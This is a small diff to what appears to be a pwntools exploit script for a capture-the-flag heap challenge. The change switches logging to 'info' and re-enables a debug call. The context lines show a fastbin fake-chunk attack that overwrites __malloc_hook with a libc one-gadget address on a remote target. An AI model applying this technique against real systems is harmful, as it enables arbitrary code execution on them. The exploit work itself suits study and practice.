@@ -27,7 +27,7 @@ if sys.argv[1] == "l":
     oneGadget = 0x3f32a
 
 else:
-    context.log_level = "error"
+    context.log_level = "info"
     io = remote(remoteAddr, remotePort)
     if libcPath:
         libc = ELF(libcPath)
@@ -87,7 +87,7 @@ if __name__ == "__main__":
     Raise(0x60, p64(libc.sym['__malloc_hook'] - 0x28 + 5)) # 2 -> 1 -> fakeChunk
     Raise(0x60, 'a' * 0x60) # 1 -> fakeChunk
     Raise(0x60, 'b' * 0x60) # fakeChunk
-    #  DEBUG([0xDA1], True)
+    DEBUG([0xDA1], True)
     Raise(0x60, '\0' * 19 + p64(libc.address + oneGadget))
 
     #  DEBUG([0xE74], True)
